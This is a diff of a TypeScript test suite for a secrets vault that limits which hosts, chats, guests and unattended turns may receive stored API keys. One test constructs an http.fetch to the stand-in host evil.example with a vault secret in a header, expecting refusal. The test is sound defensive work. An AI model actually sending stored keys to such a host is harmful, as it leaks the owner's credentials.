@@ -125,12 +125,27 @@ describe("SecretsRegistry over a vault", () => {
   });
 
   it("places a vault key only in a declared slot, to a bound host", () => {
-    const ok = placeSecrets("http.fetch", { url: "https://api.stripe.com/v1", headers: { authorization: `Bearer {{secret:${key}}}` } }, HTTP_SECRET_SLOTS, reg);
+    const owner = { conversationId: "c1", attended: true, guest: false };
+    const ok = placeSecrets("http.fetch", { url: "https://api.stripe.com/v1", headers: { authorization: `Bearer {{secret:${key}}}` } }, HTTP_SECRET_SLOTS, reg, owner);
     expect(ok).toEqual({ input: { url: "https://api.stripe.com/v1", headers: { authorization: "Bearer sk_live_vaulted_0123456789" } } });
-    const elsewhere = placeSecrets("http.fetch", { url: "https://evil.example/", headers: { a: `{{secret:${key}}}` } }, HTTP_SECRET_SLOTS, reg);
+    const elsewhere = placeSecrets("http.fetch", { url: "https://evil.example/", headers: { a: `{{secret:${key}}}` } }, HTTP_SECRET_SLOTS, reg, owner);
     expect(elsewhere).toMatchObject({ refused: expect.stringMatching(/only to api.stripe.com/) });
-    const unbound = placeSecrets("http.fetch", { url: "https://x.example/", headers: { a: `{{secret:${note}}}` } }, HTTP_SECRET_SLOTS, reg);
+    const unbound = placeSecrets("http.fetch", { url: "https://x.example/", headers: { a: `{{secret:${note}}}` } }, HTTP_SECRET_SLOTS, reg, owner);
     expect(unbound).toMatchObject({ refused: expect.stringMatching(/Secrets page/) });
+  });
+
+  it("keeps a vault key from guests, from unattended turns unless allowed, and outside its chats", () => {
+    const call = { url: "https://api.stripe.com/v1", headers: { authorization: `Bearer {{secret:${key}}}` } };
+    const place = (who?: { conversationId?: string; attended: boolean; guest: boolean }) => placeSecrets("http.fetch", call, HTTP_SECRET_SLOTS, reg, who);
+    expect(place({ conversationId: "c1", attended: true, guest: false })).toHaveProperty("input");
+    expect(place({ conversationId: "c1", attended: true, guest: true })).toMatchObject({ refused: expect.stringMatching(/guest/) });
+    expect(place({ conversationId: "c1", attended: false, guest: false })).toMatchObject({ refused: expect.stringMatching(/needs the owner present/) });
+    expect(place()).toMatchObject({ refused: expect.stringMatching(/needs the owner present/) });
+    vault.update(key, { policy: { unattended: true, chats: ["c2"] } });
+    expect(place({ conversationId: "c1", attended: true, guest: false })).toMatchObject({ refused: expect.stringMatching(/not allowed in this chat/) });
+    expect(place({ conversationId: "c2", attended: false, guest: false })).toHaveProperty("input");
+    // An env secret has no policy.
+    expect(placeSecrets("http.fetch", { url: "https://api.stripe.com/", headers: { a: "{{secret:stripe}}" } }, HTTP_SECRET_SLOTS, SecretsRegistry.fromEnv({ KOS_SECRET_STRIPE: "sk-env-stripe-value-123", KOS_SECRET_STRIPE_HOSTS: "api.stripe.com" } as NodeJS.ProcessEnv), { attended: false, guest: true })).toHaveProperty("input");
   });
 
   it("scrubs every vault value, with its transforms and a card by its digits", () => {
